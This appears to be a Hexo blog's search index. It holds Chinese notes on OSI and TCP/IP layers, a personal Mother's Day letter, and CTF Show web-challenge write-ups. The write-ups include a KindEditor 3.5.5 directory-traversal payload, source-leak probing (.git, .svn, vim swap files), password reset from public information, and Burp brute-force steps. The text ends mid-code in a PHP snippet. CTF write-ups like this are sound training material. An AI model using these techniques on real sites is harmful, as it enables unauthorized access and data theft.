<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>1.7 计算机网络的体系结构</title>
    <url>/2021/10/08/1.7-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9A%84%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-7-计算机网络的体系结构"><a href="#1-7-计算机网络的体系结构" class="headerlink" title="1.7 计算机网络的体系结构"></a>1.7 计算机网络的体系结构</h1><ul>
<li>ISO 国际标准化组织</li>
<li>OSI / RM  互连网法律上的国际标准</li>
<li>TCP / IP 因特网事实上的国际标准</li>
<li>网络协议  Network Protocols   数据交换存寿的规则、标准与约定</li>
<li>网络体系结构  计算机网络各层及其协议的集合</li>
</ul>
<h2 id="1-7-1-OSI-七层模型"><a href="#1-7-1-OSI-七层模型" class="headerlink" title="1.7.1 OSI 七层模型"></a>1.7.1 OSI 七层模型</h2><p><strong>开放式系统互联通信参考模型</strong>（英语：Open System Interconnection Reference Model，缩写为 OSI），简称为  <em>OSI模型</em>（OSI model），一种 <em>概念模型</em>，由 <em>国际标准化组织</em> 提出，一个试图使各种计算机在世界范围内互连为网络的标准框架。</p>
<p><strong>应用层</strong>：可以产生流量，可以与用户进行交互的应用程序</p>
<p><strong>表示层</strong>：是否加密？ 是否压缩？  编码问题？  开发人员需要考虑的问题</p>
<p><strong>会话层</strong>：服务端与客户端建立的会话   可查看木马：<code>netstat -nb </code></p>
<p>​    例如：远程桌面建立会话</p>
<blockquote>
<p>192.168.158.1   远程连接    192.168.158.115</p>
</blockquote>
<ul>
<li><p>对 192.168.158.115 进行端口查看，可以看到 存在远程桌面的会话</p>
<p><code>netstat -an</code></p>
</li>
</ul>
<p><img src="https://i.loli.net/2021/10/07/hFeXnqdbw1MSTNI.png" alt="image-20211007175448711"></p>
<ul>
<li><p>进一步 进行 “木马” 查看：</p>
<p><code>netstat -nb</code></p>
</li>
</ul>
<p><img src="https://i.loli.net/2021/10/07/eYxl8Gr1UKgtuho.png" alt="image-20211007175644564"></p>
<p>例：当想查看当前计算机中是否存在木马，可以打开电脑，不进行任何操作，即无流量传输，后 命令 <code>netstat -nb</code>  ，查看进程。</p>
<p><strong>传输层：</strong>可靠传输（建立会话），不可靠传输（不建立会话），流量控制</p>
<p><strong>网络层：</strong>IP地址编址，选择最佳路径（动态路由协议）</p>
<p><strong>数据链路层：</strong>规定数据如何封装，添加物理层地址（MAC 地址）</p>
<p><strong>物理层：</strong>电压、接口标准</p>
<blockquote>
<p><strong>应用举例：</strong></p>
<p>​    <strong>网络排错</strong>：分层检查：从最底层开始向上逐一排查</p>
<pre><code>1. 网线是否插好？（物理层）
2.  IP地址 检查 （网络层）
3. 浏览器 恶意插件？（应用层）
</code></pre>
<p>终极：重装，重启，格式化</p>
</blockquote>
<blockquote>
<p><strong>网络安全与 OSI 参考模型</strong></p>
<ol>
<li>物理层安全     设置 <em>交换机</em> 某接口禁止 外来用户 的连接</li>
<li>数据链路层安全   ADSL、AP密码</li>
<li>网络层安全    设置 <em>路由器</em> 某接口 禁止外来用户 的连接</li>
<li>应用层安全      SQL注入、文件上传、文件包含等等 应用层漏洞、各种攻击手段等</li>
</ol>
</blockquote>
<h2 id="1-7-2-TCP-IP-四层模型"><a href="#1-7-2-TCP-IP-四层模型" class="headerlink" title="1.7.2 TCP/IP 四层模型"></a>1.7.2 TCP/IP 四层模型</h2><p><strong>应用层</strong>   （包括了 表示层、会话层）</p>
<p><strong>传输层</strong></p>
<p><strong>网络层</strong></p>
<p>**网络接口层 **  （包括了 数据链路层、物理层）</p>
<h2 id="1-7-3-五层协议-对应-数据单元-以及-数据简单-运输过程"><a href="#1-7-3-五层协议-对应-数据单元-以及-数据简单-运输过程" class="headerlink" title="1.7.3 五层协议  对应 数据单元  以及 数据简单 运输过程"></a>1.7.3 五层协议  对应 <code>数据单元</code>  以及 <code>数据简单 运输过程</code></h2><p><strong>应用层</strong>             传输数据单元：PDU</p>
<p>**传输层    **         运输层 报文   <code>加 TCP/UDP</code></p>
<p><strong>网络层</strong>             IP 数据包 （IP 分组）  <code>加 IP 地址</code></p>
<p><strong>数据链路层</strong>      数据帧   <code>加 MAC 地址，加帧头帧尾 </code> </p>
<p><strong>物理层</strong>              比特流  bit  (01构成)    </p>
<p><img src="https://i.loli.net/2021/10/08/h5k2MJC7V6KS3wb.png" alt="image-20211008194422314"></p>
<p> <img src="https://i.loli.net/2021/10/08/bfYMdNl1crxivny.png" alt="image-20211008194507335"></p>
<h2 id="1-7-4-基本概念"><a href="#1-7-4-基本概念" class="headerlink" title="1.7.4 基本概念"></a>1.7.4 基本概念</h2><p><strong>实体 entity</strong> ：交换信息或软件进程</p>
<p><strong>协议 protocol</strong> ：控制两个对等实体通信的规则</p>
<p><strong>服务 service</strong> ：下层向上层提供服务，上层需要使用下层提供的服务来实现本层的功能</p>
<p><strong>服务访问点 SAP</strong> ：相邻两层实体之间交换信息的地方</p>
<p><img src="https://i.loli.net/2021/10/08/RexqQ58rS27CJ19.png" alt="image-20211008193707527"></p>
<h2 id="1-7-5-实操"><a href="#1-7-5-实操" class="headerlink" title="1.7.5 实操"></a>1.7.5 实操</h2><p><strong>查看本地网络连接网速：</strong></p>
<blockquote>
<p>测试：windows 7 </p>
</blockquote>
<p><img src="https://i.loli.net/2021/10/08/EOCmnvh81937pGQ.png" alt="image-20211008195814866"></p>
<p>自动协商是根据双方速率进行自动设置，如果强制设置为与另一方速率不匹配的网速，则无法正常进行通信。</p>
]]></content>
      <categories>
        <category>计网</category>
      </categories>
      <tags>
        <tag>计网</tag>
      </tags>
  </entry>
  <entry>
    <title>2021年的母亲节</title>
    <url>/2021/05/09/2021%E5%B9%B4%E7%9A%84%E6%AF%8D%E4%BA%B2%E8%8A%82/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>​    从前我总是不曾在意一些节日，就连身边人的生日也从不上心，也许是离家久了，也许了自己长大了许多，也许是自己在害怕些什么，也许是自己突然意识到某些东西它并不是一成不变的，到了今年今日，我再也无法对这些节日避讳，我意识到，今天过后，我需要做出一些改变。</p>
<p>​    以下是我想对她说的话：</p>
<blockquote>
<p>母亲节到了，你要当一个乖一点的妈妈，<br>多陪我聊聊天；<br>多学着做一些好吃的饭；<br>多多把我的房间打扫的干干净净；<br>多多听一些我推荐给你的歌；<br>多多听我劳力唠叨，抱怨这抱怨那；<br>多多听我讲我好想讲的话，关于歌手的，关于明星的，关于电视剧的，关于电影的，关于杰哥的，关于学校的，关于朋友的，关于我遇到的好多好多事；<br>多多给我一些预料不到的好吃的；<br>多多身体好一些；<br>多多快乐一些；<br>多多在全民K歌上唱歌；<br>多多和朋友出去散心；<br>多多表达出自己的感情；<br>多多对自己好一点；<br>少吃点泡面，多吃些肉；<br>多多吃你最爱的苹果；<br>多多喝热水；<br>早点睡，晚点起；<br>少想那些乱七八糟的；<br>不用担心我，不用考虑未来（反正一定是跟我在一起的）；<br>就这样吧，也说的挺多了，反正就是，你要记得，做一个乖一点的妈妈哦！</p>
</blockquote>
<p>2021.5.9</p>
]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>CTF Show---信息搜集</title>
    <url>/2021/10/01/CTF-Show-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>CTF Show 中 web入门，信息搜集篇。</p>
<span id="more"></span>

<h1 id="一、CTF-Show-—-信息搜集"><a href="#一、CTF-Show-—-信息搜集" class="headerlink" title="一、CTF Show — 信息搜集"></a>一、CTF Show — 信息搜集</h1><h2 id="1-1-Web1-—-查看源代码"><a href="#1-1-Web1-—-查看源代码" class="headerlink" title="1.1 Web1 — 查看源代码"></a>1.1 Web1 — 查看源代码</h2><p>直接查看源代码</p>
<p><img src="https://i.loli.net/2021/07/14/QcVRY3rX9a4USMZ.png" alt="image-20210714105835548"></p>
<h2 id="1-2-Web-2-—-查看源代码"><a href="#1-2-Web-2-—-查看源代码" class="headerlink" title="1.2 Web 2 — 查看源代码"></a>1.2 Web 2 — 查看源代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">js前台拦截 === 无效操作</span><br></pre></td></tr></table></figure>

<p><strong>查看源代码的几种方式</strong></p>
<ul>
<li>右键查看源代码</li>
<li>F12 打开开发者工具</li>
<li>Ctrl + U 查看源代码</li>
<li>Burp 抓包查看</li>
</ul>
<h2 id="1-3-Web-3-—-抓包"><a href="#1-3-Web-3-—-抓包" class="headerlink" title="1.3 Web 3 — 抓包"></a>1.3 Web 3 — 抓包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">没思路的时候抓个包看看，可能会有意外收获</span><br></pre></td></tr></table></figure>

<p>抓包 尝试</p>
<p><img src="https://i.loli.net/2021/07/14/kOtL1lBa8b53pIS.png" alt="image-20210714111126154"></p>
<h2 id="1-4-Web-4-—-robots-txt-泄露"><a href="#1-4-Web-4-—-robots-txt-泄露" class="headerlink" title="1.4 Web 4 — robots.txt 泄露"></a>1.4 Web 4 — robots.txt 泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">总有人把后台地址写入robots，帮黑阔大佬们引路。</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/1t2zsvMoAJTPO3V.png" alt="image-20210714111325675"></p>
<p><img src="https://i.loli.net/2021/07/14/npvowT7mgbIzx2C.png" alt="image-20210714111358421"></p>
<h2 id="1-5-Web-5-—-phps-文件"><a href="#1-5-Web-5-—-phps-文件" class="headerlink" title="1.5 Web 5 — phps 文件"></a>1.5 Web 5 — phps 文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phps源码泄露有时候能帮上忙</span><br></pre></td></tr></table></figure>

<blockquote>
<p> <strong>phps文件</strong></p>
<p> ​    就是php的 <strong>源代码文件</strong>，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。</p>
<p> ​    它的MIME类型为：text/html, application/x-httpd-php-source, application/x-httpd-php3-source。</p>
</blockquote>
<p><img src="https://i.loli.net/2021/07/14/m2Mex6SziNTg7EW.png" alt="image-20210714111652581"></p>
<p><img src="https://i.loli.net/2021/07/14/wRkJOuGiavhnM7N.png" alt="image-20210714111806962"></p>
<h2 id="1-6-Web-6-—-www-zip-泄露"><a href="#1-6-Web-6-—-www-zip-泄露" class="headerlink" title="1.6 Web 6 — www.zip 泄露"></a>1.6 Web 6 — <a href="http://www.zip/">www.zip</a> 泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解压源码到当前目录，测试正常，收工</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/9NrWGukdyw5EVMX.png" alt="image-20210714111959516"></p>
<p><img src="https://i.loli.net/2021/07/14/uZqlnDYc3SFaAMC.png" alt="image-20210714113312486"></p>
<p><img src="https://i.loli.net/2021/07/14/xWMmasCKAd91Pfq.png" alt="image-20210714113251749"></p>
<h2 id="1-7-Web-7-—-版本控制-git"><a href="#1-7-Web-7-—-版本控制-git" class="headerlink" title="1.7 Web 7 — 版本控制 .git"></a>1.7 Web 7 — 版本控制 <code>.git</code></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">版本控制很重要，但不要部署到生产环境更重要。</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/mWX7dRU4ntLrFZs.png" alt="image-20210714150846912"></p>
<h2 id="1-8-Web-8-—-版本控制-svn"><a href="#1-8-Web-8-—-版本控制-svn" class="headerlink" title="1.8 Web 8 — 版本控制 .svn"></a>1.8 Web 8 — 版本控制 <code>.svn</code></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">版本控制很重要，但不要部署到生产环境更重要。</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/DZMXJGrz7fAC9ju.png" alt="image-20210714152837039"></p>
<h2 id="1-9-Web-9-—-vim-临时文件缓存"><a href="#1-9-Web-9-—-vim-临时文件缓存" class="headerlink" title="1.9 Web 9 — vim 临时文件缓存"></a>1.9 Web 9 — vim 临时文件缓存</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</span><br></pre></td></tr></table></figure>

<p><strong>Vim 缓存</strong></p>
<blockquote>
<p>​    <strong>临时文件</strong> 是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动</p>
<p>删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可</p>
<p>以通过缓存文件恢复原始文件内容</p>
<p>​    <strong>以 index.php 为例</strong> </p>
<ol>
<li><p>第一次产生的缓存文件名为 <code>.index.php.swp</code></p>
</li>
<li><p>第二次意外退出后，文件名为 <code>.index.php.swo</code></p>
</li>
<li><p>第三次产生的缓存文件则为 <code>.index.php.swn</code></p>
</li>
</ol>
</blockquote>
<p><img src="https://i.loli.net/2021/07/14/AJUYaWD9ImPz7bF.png" alt="image-20210714153426274"></p>
<h2 id="1-10-Web-10-—-cookie-泄露"><a href="#1-10-Web-10-—-cookie-泄露" class="headerlink" title="1.10 Web 10 — cookie 泄露"></a>1.10 Web 10 — cookie 泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cookie 只是一块饼干，不能存放任何隐私数据</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/3R6u9WMdatXgSOv.png" alt="image-20210714154500245"></p>
<h2 id="1-11-Web-11-—-域名解析查询"><a href="#1-11-Web-11-—-域名解析查询" class="headerlink" title="1.11 Web 11 — 域名解析查询"></a>1.11 Web 11 — 域名解析查询</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</span><br></pre></td></tr></table></figure>

<p><strong>查看域名解析</strong></p>
<ul>
<li><p><code>nslookup</code> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup -qt=txt ctfshow.com</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#nslookup 查询#直接域名查询nslookup domain#查询记录nslookup -qt = type domain [dns-server]type:    A 				--&gt;地址记录    AAAA   			--&gt;地址记录    AFSDB Andrew    --&gt;文件系统数据库服务器记录    ATMA 			--&gt;ATM地址记录    CNAME  			--&gt;别名记录    HINHO 		 	--&gt;硬件配置记录，包括CPU、操作系统信息     ISDN   			--&gt;域名对应的ISDN号码    MB  	 		--&gt;存放指定邮箱的服务器    MG    			--&gt;邮件组记录    MINFO   		--&gt;邮件组和邮箱的信息记录    MR   			--&gt;改名的邮箱记录    MX   			--&gt;邮件服务器记录    NS 				--&gt; 名字服务器记录    PTR    			--&gt;反向记录    RP   			--&gt;负责人记录    RT  			--&gt;路由穿透记录    SRV    			--&gt;TCP服务器信息记录    TXT   			--&gt;域名对应的文本信息    X25  			--&gt;域名对应的X.25地址记录</span></span><br></pre></td></tr></table></figure></li>
<li><p>在线历史解析记录查询</p>
<p><img src="https://i.loli.net/2021/07/14/knpAHlIUJx7zyYK.png" alt="image-20210714155814946"></p>
</li>
<li><p>阿里云 DNS 检测</p>
<p><a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a></p>
<p><img src="https://i.loli.net/2021/07/14/yef6FBRPSJTgoKw.png" alt="image-20210714170535242"></p>
</li>
</ul>
<h2 id="1-12-Web-12-—-网站公开信息"><a href="#1-12-Web-12-—-网站公开信息" class="headerlink" title="1.12 Web 12 — 网站公开信息"></a>1.12 Web 12 — 网站公开信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有时候网站上的公开信息，就是管理员常用密码</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/hjlGXmsgyWSYrwf.png" alt="image-20210714171715223"></p>
<p><img src="https://i.loli.net/2021/07/14/eqwKlZuvLd2PJX8.png" alt="image-20210714171804528"></p>
<h2 id="1-13-Web-13-—-网站技术文档"><a href="#1-13-Web-13-—-网站技术文档" class="headerlink" title="1.13 Web 13 — 网站技术文档"></a>1.13 Web 13 — 网站技术文档</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/R2degLa3pzZKuni.png" alt="image-20210714172026755"></p>
<p><img src="https://i.loli.net/2021/07/14/lcYNRWCgMmvZaPw.png" alt="image-20210714172038292"></p>
<p><img src="https://i.loli.net/2021/07/14/lcpfsX1RWYOA3zP.png" alt="image-20210714172215536"></p>
<h2 id="1-14-Web-14-—-KindEditor-3-5-5-遍历目录漏洞（编辑器漏洞）"><a href="#1-14-Web-14-—-KindEditor-3-5-5-遍历目录漏洞（编辑器漏洞）" class="headerlink" title="1.14 Web 14 — KindEditor 3.5.5 遍历目录漏洞（编辑器漏洞）"></a>1.14 Web 14 — KindEditor 3.5.5 遍历目录漏洞（编辑器漏洞）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人2. 小0day:某编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录</span><br></pre></td></tr></table></figure>

<p><strong>KindEditor 3.5.5 遍历目录漏洞</strong>        <a href="http://www.nxadmin.com/web/96.html">http://www.nxadmin.com/web/96.html</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload/url/editor/php/file_manager_json.php?path=/	#可爆出根目录下所有文件/url/editor/php/file_manager_json.php?path=/var/www/html/</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/15/27sLANSvX83kgRw.png" alt="image-20210715100641820"></p>
<p><img src="https://i.loli.net/2021/07/15/y9mVSprWKqZFPGT.png" alt="image-20210715100746950"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/url/editor/php/file_manager_json.php?path=/var/www/html/nothinghere/</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/15/rF2dO9o3JD8cVCx.png" alt="image-20210715100941439"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/url/nothinghere/fl000g.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/15/xPqTEnG4DrLtIwy.png" alt="image-20210715101127445"></p>
<p>拓展：<a href="https://blog.csdn.net/u011781521/article/details/59057759/">编辑器漏洞</a></p>
<h2 id="1-15-Web-15-—-前端邮箱信息泄露"><a href="#1-15-Web-15-—-前端邮箱信息泄露" class="headerlink" title="1.15 Web 15 — 前端邮箱信息泄露"></a>1.15 Web 15 — 前端邮箱信息泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">公开的信息比如邮箱，可能造成信息泄露，产生严重后果</span><br></pre></td></tr></table></figure>

<p>前端页面当中找到邮箱信息</p>
<p><img src="https://i.loli.net/2021/07/14/NqisDzZkouH2Oyb.png" alt="image-20210714173643444"></p>
<p><img src="https://i.loli.net/2021/07/14/Gzt8XqyCpu5drMk.png" alt="image-20210714173940662"></p>
<p>忘记密码 密保答案 西安 </p>
<p>成功重置密码</p>
<p>成功登录 拿到 flag</p>
<h2 id="1-16-Web-16-—-探针信息"><a href="#1-16-Web-16-—-探针信息" class="headerlink" title="1.16 Web 16 — 探针信息"></a>1.16 Web 16 — 探针信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</span><br></pre></td></tr></table></figure>

<p><strong>PHP 探针</strong></p>
<blockquote>
<p>​    <strong>php探针</strong> 是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%A1%AC%E7%9B%98/486482">服务器硬盘</a>资源、内存占用、网卡流量、系统负载、服务器时间等信息。</p>
</blockquote>
<p><a href="https://www.laozuo.org/16305.html">常用4款PHP探针</a></p>
<p>应该是雅黑探针，访问 <code>/tz.php</code></p>
<p><img src="https://i.loli.net/2021/07/14/Yb2xc5XQIrMFopy.png" alt="image-20210714213514783"></p>
<p>查找 <code>ctfshow</code> 即可</p>
<h2 id="1-17-Web-17-—-绕过-CDN-查-IP"><a href="#1-17-Web-17-—-绕过-CDN-查-IP" class="headerlink" title="1.17 Web 17 — 绕过 CDN 查 IP"></a>1.17 Web 17 — 绕过 CDN 查 IP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">透过重重缓存，查找到ctfer.com的真实IP，提交 flag&#123;IP地址&#125; </span><br></pre></td></tr></table></figure>

<p>全球 ping 可知：无 CDN </p>
<p>查 <code>www.ctfshow.com</code> 的 IP，即为 ctfer.com的真实IP</p>
<h2 id="1-18-Web-18-—-前端-js-泄露"><a href="#1-18-Web-18-—-前端-js-泄露" class="headerlink" title="1.18 Web 18 — 前端 js 泄露"></a>1.18 Web 18 — 前端 js 泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不要着急，休息，休息一会儿，玩101分给你flag</span><br></pre></td></tr></table></figure>

<p>查看源码，发现 <code>Flappy_js.j</code></p>
<p><img src="https://i.loli.net/2021/07/14/JzW2SpRsToZ91FA.png" alt="image-20210714180947784"></p>
<p>unicode 解码</p>
<p><img src="https://i.loli.net/2021/07/14/8H1RKnwdOsVSoY6.png" alt="image-20210714181055283"></p>
<p>访问 <code>110.php</code></p>
<p><img src="https://i.loli.net/2021/10/01/GP8DOvbLRjIf4yC.png" alt="image-20210714181154250"></p>
<h2 id="1-19-Web-19-—-前端密钥泄露"><a href="#1-19-Web-19-—-前端密钥泄露" class="headerlink" title="1.19 Web 19 — 前端密钥泄露"></a>1.19 Web 19 — 前端密钥泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密钥什么的，就不要放在前端了</span><br></pre></td></tr></table></figure>

<p>查看源码得到</p>
<p><img src="https://i.loli.net/2021/10/01/Wah8ZeLOXHFm1lw.png" alt="image-20210714181430721"></p>
<p>会有函数对我们提交的内容进行加密处理，处理后结果如果是下面绿色部分就显示flag，我们完全可以抓包直接将其修改为正确的样子</p>
<p><img src="https://i.loli.net/2021/07/14/xOsDeocflHvaiu6.png" alt="image-20210714181906722"></p>
<h2 id="1-20-Web-20-—-早期-asp-access-db-db-mdb-文件泄露"><a href="#1-20-Web-20-—-早期-asp-access-db-db-mdb-文件泄露" class="headerlink" title="1.20 Web 20 — 早期 asp+access /db/db.mdb 文件泄露"></a>1.20 Web 20 — 早期 asp+access <code>/db/db.mdb</code> 文件泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/14/iFHty9PwMOAcWQb.png" alt="image-20210714182153060"></p>
<h2 id="1-21-Web-382-—"><a href="#1-21-Web-382-—" class="headerlink" title="1.21 Web 382 —"></a>1.21 Web 382 —</h2><p>首先查看源代码</p>
<p><img src="https://i.loli.net/2021/08/03/J71pYxy4QUmt2eM.png" alt="image-20210803095937572"></p>
<p>可以一一进行尝试，最后发现 <code>http://url/alsckdfy/</code> 竟然是网站的后台登录页面    </p>
<ul>
<li>爆破 弱密码</li>
<li>sql 万能密码</li>
</ul>
<p>成功登录之后即可获得 flag</p>
<h1 id="二、做题总结"><a href="#二、做题总结" class="headerlink" title="二、做题总结"></a>二、做题总结</h1><ul>
<li><p>第一步：查看 <strong>源代码</strong></p>
<ul>
<li>右键查看源代码</li>
<li>F12 打开开发者工具</li>
<li>Ctrl + U 查看源代码</li>
<li>Burp 抓包查看</li>
</ul>
</li>
<li><p><strong>抓包</strong> 可能发现一些有用信息</p>
</li>
<li><p><strong>robots.txt</strong> </p>
</li>
<li><p><strong>phps</strong> 源代码泄露</p>
</li>
<li><p>下载源码文件、网站备份文件</p>
</li>
<li><p>版本控制不要部署到生产环境中 <code>.git  .svn</code></p>
</li>
<li><p><strong>Vim 缓存</strong>    <code>.文件名.php.swp  .文件名.php.swo  .文件名.php.swn</code></p>
</li>
<li><p>cookie 的重要性</p>
</li>
<li><p>域名、子域名 信息搜集    <code>nslookup   在线网站</code></p>
</li>
<li><p>Banner 等公开信息   <code>管理员密码  QQ  QQ邮箱等  第三方软件查个人信息</code></p>
</li>
<li><p>技术文档</p>
</li>
<li><p>对应编辑器漏洞</p>
</li>
<li><p>探针</p>
</li>
<li><p>前端源码 密钥泄露</p>
</li>
<li><p><strong>db.mdb</strong></p>
</li>
</ul>
]]></content>
      <categories>
        <category>CTF Show</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Show-爆破</title>
    <url>/2021/10/01/CTF-Show-%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>CTF show 爆破篇。</p>
<span id="more"></span>

<h1 id="一、CTF-show-—-爆破"><a href="#一、CTF-show-—-爆破" class="headerlink" title="一、CTF show — 爆破"></a>一、CTF show — 爆破</h1><h2 id="1-1-Web-21-—-Burp-爆破-—-base64-encode"><a href="#1-1-Web-21-—-Burp-爆破-—-base64-encode" class="headerlink" title="1.1 Web 21 — Burp 爆破 — base64-encode"></a>1.1 Web 21 — Burp 爆破 — base64-encode</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆破什么的，都是基操</span><br></pre></td></tr></table></figure>

<p><strong>抓包查看</strong>：输入的账号密码都被base64加密了，并且中间还有一个 <code>:</code> 分割</p>
<p>Burp 抓包，下载题目给的字典，进行爆破：手动更改 <code>admin:</code> base64 加密之后的内容，只将密码部分设为变量，加载题目字典，设置 base64-encode 加密，<strong>去掉勾选 URL编码</strong>，开始攻击。</p>
<p><img src="https://i.loli.net/2021/07/14/MTD1Bp7G5F2tAiU.png" alt="image-20210714212830673"></p>
<p><img src="https://i.loli.net/2021/07/14/bxHg23aGJ7BWPe6.png" alt="image-20210714212813152"></p>
<h2 id="1-2-Web-22-—-子域名爆破-—-subDomainBrute-工具"><a href="#1-2-Web-22-—-子域名爆破-—-subDomainBrute-工具" class="headerlink" title="1.2 Web 22 — 子域名爆破 — subDomainBrute 工具"></a>1.2 Web 22 — 子域名爆破 — subDomainBrute 工具</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域名也可以爆破的，试试爆破这个ctf.show的子域名</span><br></pre></td></tr></table></figure>

<p><strong>subDomainBrute 工具子域名爆破</strong></p>
<p><img src="https://i.loli.net/2021/07/15/24RTe3VNyP5ujhU.png" alt="image-20210715113857094"></p>
<p>访问 <code>http://flag.ctfer.com/index.php</code></p>
<h2 id="1-3-Web-23-—-根据代码要求写脚本"><a href="#1-3-Web-23-—-根据代码要求写脚本" class="headerlink" title="1.3 Web 23 — 根据代码要求写脚本"></a>1.3 Web 23 — 根据代码要求写脚本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">还爆破？这么多代码，告辞！</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$token</span> = md5(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span 